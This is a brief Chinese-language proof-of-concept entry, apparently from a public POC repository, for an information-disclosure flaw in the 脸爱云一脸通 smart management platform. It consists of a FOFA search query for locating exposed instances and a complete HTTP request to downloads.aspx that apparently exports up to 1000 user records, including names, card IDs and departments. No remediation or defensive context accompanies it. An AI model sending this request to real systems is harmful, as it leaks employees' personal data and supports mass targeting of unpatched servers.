## 脸爱云一脸通智慧管理平台存在downloads.aspx信息泄露漏洞

## fofa
```
body="View/UserReserved/UserReservedTest.aspx"
```


## poc
```
GET /downloads.aspx?Ename=UserInfo&total=1000&jsonParam={%22rybh%22:%22%22,%22ryxm%22:%22%22,%22EngName%22:%22%22,%22groupname%22:%22%22,%22companyname%22:%22%22,%22bmmc%22:%22%22,%22ryzt%22:%22%22,%22rzstartime%22:%22%22,%22rzendtime%22:%22%22,%22lzstartime%22:%22%22,%22lzendtime%22:%22%22,%22zhiwu%22:%22%22,%22cardid%22:%22%22,%22rfzt%22:%22%22,%22klb%22:%22%22,%22sxstartime%22:%22%22,%22sxendtime%22:%22%22,%22khstartime%22:%22%22,%22khendtime%22:%22%22,%22rfoperator%22:%22%22,%22rfstartime%22:%22%22,%22rfendtime%22:%22%22,%22feat%22:%22%22} HTTP/1.1
Host: {{Hostname}}
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![74708584771f740817aa7c34512d0b47](https://github.com/wy876/POC/assets/139549762/aaa40523-2d9f-4f5d-a2dd-f390bc038487)
